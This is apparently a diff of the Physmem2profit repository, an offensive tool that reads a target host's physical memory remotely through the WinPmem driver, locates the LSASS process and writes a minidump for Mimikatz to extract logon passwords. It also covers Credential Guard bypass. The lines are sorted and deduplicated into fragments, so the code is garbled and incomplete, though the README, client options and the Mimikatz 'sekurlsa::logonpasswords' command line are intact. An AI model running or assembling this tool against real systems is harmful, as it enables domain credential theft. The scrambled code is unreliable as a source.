+"    for start, end, op in sorted(operations):"
+"    if (arg is None): raise Exception(""[-] Required command line argument "" "
+"    image_base, image_ext = os.path.splitext(vmem_filepath)"
+"    internal class WinPmem : DriverService, ICommandReceiver"
+"    max_memory = s.GetParameter(""highest_usermode_address"")"
+"    mem_list = sorted([(run.start, run.end) for run in addr_space.get_address_ranges(end=max_memory)])"
+"    memoryinfo_list, memory64_list = read_memory_fast(s, module_list)"
+"    module_list = read_modulelist(s, lsass_pid)"
+"    order = ['install', 'map', 'read', 'uninstall']"
+"    parser.add_argument('--driver', choices=['winpmem'], default='winpmem', help=""Specifies class used by server to handle driver (use with mount)"")"
+"    parser.add_argument('--host', help=""Target host (use with mount)"")"
+"    parser.add_argument('--install', help=""Provides parameters needed for driver installation eg path (use with mount)"")"
+"    parser.add_argument('--label', default=('dump'), help=""Label to include in the minidump filename (use with dump)"")"
+"    parser.add_argument('--mode', choices=['mount', 'dump', 'all'], default='all', help=""Mode of operation."")"
+"    parser.add_argument('--port', type=int, default=8080, help=""Target port (use with mount)"")"
+"    parser.add_argument('--vmem', help=""Path to .vmem file (support Credential Guard)"")"
+"    print(""["
+"    return dict(MajorVersion=major, MinorVersion=minor, BuildNumber=build)"
+"    return memoryinfo_list, memory64_list"
+"    s.SetCache(""pslist_CSRSS"", set())"
+"    s.SetCache(""pslist_Handles"", set())"
+"    s.SetCache(""pslist_PspCidTable"", set())"
+"    s.SetCache(""pslist_Sessions"", set())"
+"    secure_world = read_secure_world(s, secure_world_pages)"
+"    systeminfo = read_systeminfo(s, build)"
+"    with open(filepath, 'wb') as f:"
+"   5. Submission of Contributions. Unless You explicitly state otherwise,"
+"   8. Limitation of Liability. In no event and under no legal theory,"
+"   Licensed under the Apache License, Version 2.0 (the ""License"")"
+"   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION"
+"   Unless required by applicable law or agreed to in writing, software"
+"   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
+"   distributed under the License is distributed on an ""AS IS"" BASIS,"
+"  2019"")]"
+"  <Import Project=""$(MSBuildExtensionsPath)"
+"  <Import Project=""$(MSBuildToolsPath)"
+"  <PropertyGroup Condition="" '$(Configuration)"
+" "" "" "
+" "" already exists."", Program.LogMessageSeverity.Warning)"
+" "" for driver "" "
+" "" not provided"")"
+" ""' not recognized."", Program.LogMessageSeverity.Error)"
+" "". "" "
+" ""."")"
+" ""."", Program.LogMessageSeverity.Success)"
+" ""..."")"
+" "": "" "
+" "": """
+" "":"" "
+" ""] "" "
+" (uint) AccessRights.GENERIC_WRITE, (uint) AccessRights.FILE_SHARE_READ "
+" 0o444,  'st_nlink' : 1, 'st_size' : size }"
+" 0o555, 'st_nlink' : 2 }"
+" 1, methodEnd - nameEnd - 1)"
+" 1, packet.Length - methodEnd - 1) }) as byte[]"
+" 16, order, offset, length)"
+" 16, order, self.queued_offset, self.queued_size)"
+" @exceptions FuseOSError if path was other than one supported file, or file dir."
+" @param build, build version retrived without using rekall."
+" @param fh flags, not used."
+" @param path path of file/directory, not used."
+" @param path path ot file. Not used, only one file is supported."
+" Build directory, read stream data, set new offsets to streams"
+" Build header, set offset to directory"
+" Check ten times if file was created by other process, wait 1s on each check."
+" Enumerate modules, find ""holes"" that need zero filling"
+" Function retrives page from cache, or adds page to queue."
+" Function will fetch data, without checking cache. New data will not be cached."
+" Function will first look in cache, missing data will be fetched. New data will be cached."
+" Fuse, open file."
+" Fuse, provide directory content."
+" Fuse, read attributes of files/directories."
+" Fuse, read data."
+" Fuse, read uncached data."
+" Fuse, write data."
+" If Rekall has problems parsing the .vmem file, Physmem2profit will recommend you to copy the .vmsn file and rename it to .vmss"
+" Internal, get all gathered data."
+" Internal, retrive page."
+" Internal, retrive queued data from server."
+" Loads the Winpmem driver and acts as a server, which exposes the physical RAM of the target host through a TCP port"
+" Parse command line. Ensure required parameters exist, generate optional."
+" Python module, executed on the attacking machine"
+" Reads file with remote machine memory, and starts rekall session on it."
+" Set offsets, build streams"
+" We don't want to use these, PsActiveProcessHead is faster"
+" What to read, what to zero fill"
+" commandLineArguments[i] == ""--hidden"")"
+" commandLineArguments[i] == ""--ip"")"
+" commandLineArguments[i] == ""--port"")"
+" commandLineArguments[i] == ""--verbose"")"
+" commandReceiverName, Program.LogMessageSeverity.Error)"
+" exception.Message, LogMessageSeverity.Error)"
+" exception.Message, Program.LogMessageSeverity.Error)"
+" implementation of the physmem2profit server. Still need to clean up the code and add some more functionality but will work as is, just takes one argument which is the location of the pmem driver."
+" len(tail), rva))"
+" mount will block thread, it need to be handled by child process."
+" or,"
+" pwd )"""
+" server component, "
+" sizeof(UInt64), end = offset "
+" wait for connection, before creating child process."
+" when last child joined, rest can be terminated."
+"""CSDVersion"" / Pointer(this.CSDVersionRVA, PascalString(Int32ul, ""utf-16""))"
+"""CSDVersion"" / Rebuild(Computed(lambda this: get_string(Pointer(this.CSDVersionRVA, PascalString(Int32ul, ""utf-16"")))), 0)"
+"""CvRecordData"" / Computed(lambda this: get_string(Pointer(this.CvRecord.RVA, Byte[this.CvRecord.DataSize]))),"
+"""CvRecordData"" / Pointer(this.CvRecord.RVA, Byte[this.CvRecord.DataSize]),"
+"""MiscRecordData"" / Computed(lambda this: get_string(Pointer(this.MiscRecord.RVA, Byte[this.MiscRecord.DataSize])))"
+"""ModuleName"" / Computed(lambda this: get_string(Pointer(this.ModuleNameRva, PascalString(Int32ul, ""utf-16"")))),"
+"""ModuleName"" / Pointer(this.ModuleNameRva, PascalString(Int32ul, ""utf-16"")),"
+", calls various [Rekall](https://github.com/google/rekall) plugins to analyze the memory image and to generate a minidump of the LSASS process."
+", connects to the target machine and mounts the physical RAM of the target as a raw file with the help of [FUSE](https://en.wikipedia.org/wiki/Filesystem_in_Userspace)"
+", executed on the target host"
+", performs both of the above actions. Connection with server will be closed when dump is complete."
+". The minidump contains a special stream that holds the data from the Secure World, allowing Mimikatz to locate the encryption key."
+"// COM, set the ComVisible attribute to true on that type."
+"// [assembly: AssemblyVersion(""1.0."
+"1, 1):"
+"1. In the Advanced settings, Enable VBS (Virtualization Based Security)"
+"1. The client, "
+"1024), self.read_stat_cached / (1024"
+"<Project ToolsVersion=""15.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"= stream.Read(retBuffer, numBytesRead, length - numBytesRead)"
+"AnyCPU' "">"
+"AssemblyInfo.cs"" />"
+"Decrypting credentials protected by Credential Guard requires gaining access to the encryption key that is stored in the Secure World. For testing purposes, Physmem2profit supports retrieving data from the Secure World from VMware Fusion/Workstation snapshots (.vmem files). This allows credentials protected by Credential Guard to be decrypted with the help of Mimikatz."
+"DriverService.cs"" />"
+"ICommandReceiver.cs"" />"
+"Microsoft Visual Studio Solution File, Format Version 12.00"
+"Microsoft.CSharp.targets"" />"
+"Microsoft.Common.props"" Condition=""Exists('$(MSBuildExtensionsPath)"
+"Microsoft.Common.props')"" />"
+"NEWDIR=""$( cd ""$( dirname ""${BASH_SOURCE[0]}"" )"" >/dev/null 2>"
+"OLDDIR=""$(pwd)"""
+"Physerver.cs"" />"
+"Program.cs"" />"
+"Project(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"") = ""Physmem2profit"", ""Physmem2profit.csproj"", ""{814708C9-2320-42D2-A45F-31E42DA06A94}"""
+"The support for bypassing Credential Guard by exploiting the [S3 Resume firmware vulnerability](https://www.kb.cert.org/vuls/id/976132/), demonstated in our [Disobey talk](https://disobey.fi/2020/profile/lets_get_physical), is coming soon :)."
+"WinPmem.cs"" />"
+"[assembly: AssemblyCompany("""")]"
+"[assembly: AssemblyConfiguration("""")]"
+"[assembly: AssemblyCopyright(""Copyright "
+"[assembly: AssemblyCulture("""")]"
+"[assembly: AssemblyDescription("""")]"
+"[assembly: AssemblyFileVersion(""1.0.0.0"")]"
+"[assembly: AssemblyProduct(""Physmem2profit2"")]"
+"[assembly: AssemblyTitle(""Physmem2profit2"")]"
+"[assembly: AssemblyTrademark("""")]"
+"[assembly: AssemblyVersion(""1.0.0.0"")]"
+"[assembly: Guid(""814708c9-2320-42d2-a45f-31e42da06a94"")]"
+"[submodule ""rekall""]"
+"] %u/%u MB analyzed"" % (count//1024//1024, image_size//1024//1024))"
+"] Analyzing local image %s"" % (image_base))"
+"] Analyzing physical memory"")"
+"] Checking for Credential Guard..."")"
+"] Collecting data for minidump: memory info and content"")"
+"] Collecting data for minidump: module info"")"
+"] Collecting data for minidump: system info"")"
+"] Connected"")"
+"] Connecting to %s on port %u"" % (host, port))"
+"] Credential Guard detected!"")"
+"] Driver installed"")"
+"] Exposing the physical memory as a file"")"
+"] Finding LSASS process"")"
+"] Finding Secure World pages (this will take about %u minutes)"" % (image_size//1024//1024//1024))"
+"] Generating the minidump file"")"
+"] Getting physical memory layout"")"
+"] LSASS found"")"
+"] Largest physical address is 0x%x (%u GB)"" % (image_size, image_size//1024//1024//1024))"
+"] Loading config from %s"" % (CONFIG_FILE))"
+"] No Credential Guard detected"")"
+"] Read %u MB, cached reads %u MB"" % (self.read_total / (1024"
+"] Reading %u MB of Secure World data from .vmem"" % (len(secure_world_pages)"
+"] Windows build number not known, collecting it with imageinfo plugin"")"
+"] Writing Secure World data to %s"" % (filepath))    "
+"] Wrote LSASS minidump to %s"" % (filepath))"
+"] Wrote config to config.json"")"
+"data1 = self.read_uncached(path, requested_length, offset, fh)"
+"def _cg(s, vmem_filepath, label):"
+"def _dump(label, vmem):"
+"def checkArgument(arg, str):"
+"def close(_sig = None, _frame = None):"
+"def dump(label, vmem):"
+"def init(host, port, removeOldConfig = True):"
+"def mount(sock, driver, installArguments):"
+"def read_memory_fast(s, module_list):"
+"def read_memoryinfo(s, pid):"
+"def read_modulelist(s, pid):"
+"def read_secure_world(s, secure_world_pages):"
+"def read_systeminfo(s, build):"
+"echo ""Rekall repository is empty. Please use recursive initialization of submodules"""
+"from binascii import hexlify, unhexlify"
+"from binascii import unhexlify, hexlify"
+"from construct import Struct, Const, Int64ul, Int32ul, Int16ul, Int8ul, Hex, Array, this, Probe, GreedyBytes, Pointer, Switch, Byte, PascalString, Tell, len_, RawCopy, Rebuild, Computed, Default"
+"from fuse import FUSE, FuseOSError, Operations"
+"if [ ""$(ls -A rekall)"" ]"
+"mimikatz.exe ""sekurlsa::minidump [label]-[date]-lsass.dmp"" ""sekurlsa::logonpasswords"" ""exit"""
+"n%s' % (self.driver, self.order[0], self.installArguments)).encode('utf-8')"
+"n' % (self.driver, self.order[1])).encode('utf-8')"
+"n' % (self.driver, self.order[2])).encode('utf-8')"
+"n' % (self.driver, self.order[3])).encode('utf-8')"
+"nRVA before: %x"" % (rva_before))"
+"pmem"""
+"print(""Appending cached"")"
+"print(""Appending zeros"")"
+"print(""Caching page %u"" % (self.queued_offset//self.PAGE_SIZE))"
+"print(""DTB"", hex(dtb))"
+"print(""Fetching queued data (requested %x, queued %x-%x)"" % (pagenum"
+"print(""Fetching queued data"")"
+"print(""Gathering page %u (offset %x)"" % (pagenum, pagenum"
+"print(""Image size: %u MB"" % (self.image_size/(1024"
+"print(""Items in gathered before: %u"" % (len(self.gathered)))"
+"print(""Len buf %u"" % (len(buf)))"
+"print(""Len buf %u"" % (len(buf)), hex(offset % self.PAGE_SIZE), hex(self.PAGE_SIZE-((offset"
+"print(""Read %u MB, cached reads %u MB"" % (self.read_total / (1024"
+"print(""Read %u megabytes"" % (self.read_total / (1024"
+"print(""Reading %u bytes from 0x%x"" % (length, offset))"
+"print(""Received %u bytes from offset %x"" % (len(data), self.queued_offset))"
+"print(""Received %u bytes"" % (len(data)))"
+"print(""Returning page %u (offset %x) from cache"" % (pagenum, pagenum"
+"print(""Returning zeros"")"
+"print(""Sending"")"
+"print(""Sent %u bytes. Receiving"" % (sent))"
+"print(""We have extra"")"
+"print(""[read] offset %x, length: %u"" % (offset, requested_length))"
+"print(""build"", build)"
+"print(""kernel_base"", hex(kernel_base))"
+"print(hex(start), size)"
+"protected static readonly String[] FIELDS = new String[327] { ""CR3"", ""NtBuildNumber"", ""KernBase"", ""KDBG"", ""KPCR00"", ""KPCR01"", ""KPCR02"", ""KPCR03"", ""KPCR04"", ""KPCR05"", ""KPCR06"", ""KPCR07"", ""KPCR08"", ""KPCR09"", ""KPCR10"", ""KPCR11"", ""KPCR12"", ""KPCR13"", ""KPCR14"", ""KPCR15"", ""KPCR16"", ""KPCR17"", ""KPCR18"", ""KPCR19"", ""KPCR20"", ""KPCR21"", ""KPCR22"", ""KPCR23"", ""KPCR24"", ""KPCR25"", ""KPCR26"", ""KPCR27"", ""KPCR28"", ""KPCR29"", ""KPCR30"", ""KPCR31"", ""KPCR32"", ""KPCR33"", ""KPCR34"", ""KPCR35"", ""KPCR36"", ""KPCR37"", ""KPCR38"", ""KPCR39"", ""KPCR40"", ""KPCR41"", ""KPCR42"", ""KPCR43"", ""KPCR44"", ""KPCR45"", ""KPCR46"", ""KPCR47"", ""KPCR48"", ""KPCR49"", ""KPCR50"", ""KPCR51"", ""KPCR52"", ""KPCR53"", ""KPCR54"", ""KPCR55"", ""KPCR56"", ""KPCR57"", ""KPCR58"", ""KPCR59"", ""KPCR60"", ""KPCR61"", ""KPCR62"", ""KPCR63"", ""PfnDataBase"", ""PsLoadedModuleList"", ""PsActiveProcessHead"", ""NtBuildNumberAddr"", ""Padding0"", ""Padding1"", ""Padding2"", ""Padding3"", ""Padding4"", ""Padding5"", ""Padding6"", ""Padding7"", ""Padding8"", ""Padding9"", ""Padding10"", ""Padding11"", ""Padding12"", ""Padding13"", ""Padding14"", ""Padding15"", ""Padding16"", ""Padding17"", ""Padding18"", ""Padding19"", ""Padding20"", ""Padding21"", ""Padding22"", ""Padding23"", ""Padding24"", ""Padding25"", ""Padding26"", ""Padding27"", ""Padding28"", ""Padding29"", ""Padding30"", ""Padding31"", ""Padding32"", ""Padding33"", ""Padding34"", ""Padding35"", ""Padding36"", ""Padding37"", ""Padding38"", ""Padding39"", ""Padding40"", ""Padding41"", ""Padding42"", ""Padding43"", ""Padding44"", ""Padding45"", ""Padding46"", ""Padding47"", ""Padding48"", ""Padding49"", ""Padding50"", ""Padding51"", ""Padding52"", ""Padding53"", ""Padding54"", ""Padding55"", ""Padding56"", ""Padding57"", ""Padding58"", ""Padding59"", ""Padding60"", ""Padding61"", ""Padding62"", ""Padding63"", ""Padding64"", ""Padding65"", ""Padding66"", ""Padding67"", ""Padding68"", ""Padding69"", ""Padding70"", ""Padding71"", ""Padding72"", ""Padding73"", ""Padding74"", ""Padding75"", ""Padding76"", ""Padding77"", ""Padding78"", ""Padding79"", ""Padding80"", ""Padding81"", ""Padding82"", ""Padding83"", ""Padding84"", ""Padding85"", ""Padding86"", ""Padding87"", ""Padding88"", ""Padding89"", ""Padding90"", ""Padding91"", ""Padding92"", ""Padding93"", ""Padding94"", ""Padding95"", ""Padding96"", ""Padding97"", ""Padding98"", ""Padding99"", ""Padding100"", ""Padding101"", ""Padding102"", ""Padding103"", ""Padding104"", ""Padding105"", ""Padding106"", ""Padding107"", ""Padding108"", ""Padding109"", ""Padding110"", ""Padding111"", ""Padding112"", ""Padding113"", ""Padding114"", ""Padding115"", ""Padding116"", ""Padding117"", ""Padding118"", ""Padding119"", ""Padding120"", ""Padding121"", ""Padding122"", ""Padding123"", ""Padding124"", ""Padding125"", ""Padding126"", ""Padding127"", ""Padding128"", ""Padding129"", ""Padding130"", ""Padding131"", ""Padding132"", ""Padding133"", ""Padding134"", ""Padding135"", ""Padding136"", ""Padding137"", ""Padding138"", ""Padding139"", ""Padding140"", ""Padding141"", ""Padding142"", ""Padding143"", ""Padding144"", ""Padding145"", ""Padding146"", ""Padding147"", ""Padding148"", ""Padding149"", ""Padding150"", ""Padding151"", ""Padding152"", ""Padding153"", ""Padding154"", ""Padding155"", ""Padding156"", ""Padding157"", ""Padding158"", ""Padding159"", ""Padding160"", ""Padding161"", ""Padding162"", ""Padding163"", ""Padding164"", ""Padding165"", ""Padding166"", ""Padding167"", ""Padding168"", ""Padding169"", ""Padding170"", ""Padding171"", ""Padding172"", ""Padding173"", ""Padding174"", ""Padding175"", ""Padding176"", ""Padding177"", ""Padding178"", ""Padding179"", ""Padding180"", ""Padding181"", ""Padding182"", ""Padding183"", ""Padding184"", ""Padding185"", ""Padding186"", ""Padding187"", ""Padding188"", ""Padding189"", ""Padding190"", ""Padding191"", ""Padding192"", ""Padding193"", ""Padding194"", ""Padding195"", ""Padding196"", ""Padding197"", ""Padding198"", ""Padding199"", ""Padding200"", ""Padding201"", ""Padding202"", ""Padding203"", ""Padding204"", ""Padding205"", ""Padding206"", ""Padding207"", ""Padding208"", ""Padding209"", ""Padding210"", ""Padding211"", ""Padding212"", ""Padding213"", ""Padding214"", ""Padding215"", ""Padding216"", ""Padding217"", ""Padding218"", ""Padding219"", ""Padding220"", ""Padding221"", ""Padding222"", ""Padding223"", ""Padding224"", ""Padding225"", ""Padding226"", ""Padding227"", ""Padding228"", ""Padding229"", ""Padding230"", ""Padding231"", ""Padding232"", ""Padding233"", ""Padding234"", ""Padding235"", ""Padding236"", ""Padding237"", ""Padding238"", ""Padding239"", ""Padding240"", ""Padding241"", ""Padding242"", ""Padding243"", ""Padding244"", ""Padding245"", ""Padding246"", ""Padding247"", ""Padding248"", ""Padding249"", ""Padding250"", ""Padding251"", ""Padding252"", ""Padding253"", ""NumberOfRuns"" }"
+"self.PAGE_SIZE, self.queued_offset, self.queued_offset"
+"xml version=""1.0"" encoding=""utf-8"""
+$(MSBuildToolsVersion)
+$(Platform)' == 'Debug
+$(Platform)' == 'Release
+' as shown below:
+--mode all
+--mode dump
+--mode mount
+.Abort()
+.csproj.user
+.py[cod]
+.sys
+//      Build Number
+//      Major Version
+//      Minor Version
+//      Revision
+// General Information about an assembly is controlled through the following
+// Setting ComVisible to false makes the types in this assembly not visible
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+// Version information for an assembly consists of the following four values:
+// You can specify all the values or you can default the Build and Revision Numbers
+// associated with an assembly.
+// by using the '
+// set of attributes. Change these attribute values to modify the information
+// to COM components.  If you need to access a type in this assembly from
+1. Clone the Physmem2profit Git repository: 
+1. Copy the minidump to a Windows system and run 
+1. Create a Windows 10 virtual machine with VMware Fusion/Workstation. Join the virtual machine to a domain (Credential Guard [does not protect](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-protection-limits) local accounts)
+1. Deploy Credential Guard. An easy option is to use the [Device Guard and Credential Guard hardware readiness tool](https://www.microsoft.com/en-us/download/details.aspx
+1. For the client running on the attacking machine:
+1. For the server running on the target computer:
+1. Log in to the virtual machine (with a domain account)
+1. Reboot
+1. Run 
+1. Run Physmem2profit against the .vmem file: 
+1. Take a snapshot
+1. The C
+1024
+1024)))
+1024:
+</OutputPath>
+</Project>
+</configuration>
+<configuration>
+= 2 
+= PAGE_SIZE
+= blob
+= d.find('fill')
+= delegate { Console.ForegroundColor = previousConsoleStyle
+= extra
+= hdr
+= len(blob)
+= length
+= minidump_directory_entry.build(s)
+= s['Location']['DataSize']
+= self.PAGE_SIZE
+= self._build_memoryinfo_list_stream()
+= self.read_progress
+= self.secure_world
+= stream
+Any CPU
+Any CPU = Debug
+Any CPU = Release
+Any CPU.ActiveCfg = Debug
+Any CPU.ActiveCfg = Release
+Any CPU.Build.0 = Debug
+Any CPU.Build.0 = Release
+C being hit.
+Credential Guard
+Debug
+EndGlobal
+EndGlobalSection
+EndProject
+Global
+GlobalSection(ExtensibilityGlobals) = postSolution
+GlobalSection(ProjectConfigurationPlatforms) = postSolution
+GlobalSection(SolutionConfigurationPlatforms) = preSolution
+GlobalSection(SolutionProperties) = preSolution
+HideSolutionNode = FALSE
+Kudos for contributing:
+MEM_IMAGE = 0x1000000
+MINIDUMP_HEADER = Struct(
+MINIDUMP_MEMORY64_LIST = Struct(
+MINIDUMP_MEMORY_DESCRIPTOR64 = Struct(
+MINIDUMP_MEMORY_INFO = Struct(
+MINIDUMP_MEMORY_INFO_LIST = Struct(
+MINIDUMP_MODULE = Struct(
+MINIDUMP_MODULE_LIST = Struct(
+MINIDUMP_SIGNATURE = b'
+MINIDUMP_STRING = Struct(
+MINIDUMP_SYSTEM_INFO = Struct(
+MINIDUMP_VERSION = b'
+Memory64ListStream = 9
+MemoryInfoListStream = 16
+MimikatzStream = 0x1337
+MinimumVisualStudioVersion = 10.0.40219.1
+ModuleListStream = 4
+PAGE_SIZE//1024//1024))
+Physmem2profit can be used to create a minidump of a target host's LSASS process by analysing physical memory remotely. The intention of this research is to propose an alternative approach to credential theft and create a modular framework that can be extended to support other drivers that can access physical memory. Physmem2profit generates a minidump (.dmp) of LSASS that can be further analyzed with Mimikatz. The tool does not require Cobalt Strike but should work fine over beacon with a SOCKS proxy.
+Physmem2profit is developed by [@b3arr0](https://twitter.com/b3arr0) and [@TimoHirvonen](https://twitter.com/TimoHirvonen).
+Release
+ServiceHandle()
+SolutionGuid = {601BAC14-28FE-4664-BA29-18C983E031E8}
+SystemInfoStream = 7
+TRACE</DefineConstants>
+The idea is illustrated below:
+The tool has two components:
+VS_FIXEDFILEINFO = Struct(
+VS_FIXEFILEINFO_SIGNATURE = 0xFEEF04BD
+Virtualization-based security Services Running
+VisualStudioVersion = 16.0.29215.179
+[Rethinking Credential Theft](https://labs.f-secure.com/blog/rethinking-credential-theft/) 
+[assembly: ComVisible(false)]
+bash physmem2profit/client/install.sh
+cd $NEWDIR
+cd $OLDDIR
+cd physmem2profit/client
+class Minidump:
+class Physmem(Operations):
+client/.env/
+client/config.json
+client/output/
+client/physmem2profit/__pycache__/
+client/rekall_cache/
+client/venv/
+construct
+cryptography
+data = b'
+def ensureFileExist(path):
+def main():
+def parseInput():
+else
+endregion Configuration
+endregion Constants
+endregion Member fields
+endregion Members
+endregion WinAPI imports
+from .definitions import 
+from fsminidump.minidump import Minidump
+from multiprocessing import Process
+from rekall import plugins
+from rekall import session
+from rekall.plugins.addrspaces import intel
+fusepy
+future==0.16.0
+git clone --recurse-submodules https://github.com/FSecureLABS/physmem2profit.git
+i == commandLineArguments.Length)
+id=53337)
+if __name__ == '__main__':
+import argparse
+import datetime
+import errno
+import intervals as I
+import json
+import logging
+import mount
+import os
+import physmem2minidump
+import signal
+import socket
+import stat
+import struct
+import sys
+import tempfile
+import time
+install.sh
+jobs = []
+len(self.memory64)
+len(self.memoryinfo)
+len(self.modules)
+length
+length)
+logging.basicConfig(level=logging.CRITICAL)
+minidump_directory_entry = Struct(
+minidump_directory_entry.sizeof():hdr.StreamDirectoryRva
+minidump_directory_entry.sizeof()]
+minidump_location_descriptor = Struct(
+minidump_memory_descriptor = Struct(
+msinfo32
+n').encode('utf-8')
+namespace Physmem2profit
+output/[label]-[date]-lsass.dmp
+output/[label]-[date]-secure-world.raw
+padlen
+padlen)
+path = client/rekall
+physmem2profit
+physmem2profit.exe
+physmem2profit.exe [--ip IP] [-p PORT] [--hidden] [--verbose]
+physmem2profit/server/Physmem2profit.sln
+pip install -r requirements.txt
+print(config)
+pyaff4==0.26.post6
+python-intervals
+python3 physmem2profit --host HOST [--port PORT] [--mode MODE] [--driver DRIVER ] [--instal DRIVER_PATH_ON_TARGET] [--label LABEL_FOR_MEMORY_DUMP]
+python3 physmem2profit --mode dump --vmem /tmp/Win10-Snapshot1.vmem --label credential-guard-test
+region Configuration
+region Constants
+region Member fields
+region Members
+region WinAPI imports
+rekall/rekall-agent
+rekall/rekall-core
+rekall/rekall-lib
+requested_length) % self.PAGE_SIZE)))
+requested_length) % self.PAGE_SIZE))]
+requested_length) // self.PAGE_SIZE
+self.PAGE_SIZE
+self.PAGE_SIZE != self.queued_offset
+self.PAGE_SIZE))
+self.PAGE_SIZE:(i
+self.PAGE_SIZE]
+self.STREAM_COUNT
+self.gathered.append(self.cache[pagenum])
+self.queued_size))
+self.queued_size):
+server/
+server/.vs/
+server/bin
+server/obj
+server/packages
+size
+size = os.stat(self.root).st_size
+source .env/bin/activate
+source physmem2profit/client/.env/bin/activate
+sudo apt install -y gcc git python3-pip virtualenv libncurses5-dev fuse
+then
+url = https://github.com/google/rekall.git
+using System
+using System.Collections.Generic
+using System.ComponentModel
+using System.IO
+using System.Linq
+using System.Net
+using System.Net.Sockets
+using System.Reflection
+using System.Runtime.CompilerServices
+using System.Runtime.InteropServices
+using System.Security.Principal
+using System.Text
+using System.Threading
+virtualenv -p python3 .env
+x00'
+x00')
+x50'
+xa7'
+{814708C9-2320-42D2-A45F-31E42DA06A94}.Debug
+{814708C9-2320-42D2-A45F-31E42DA06A94}.Release
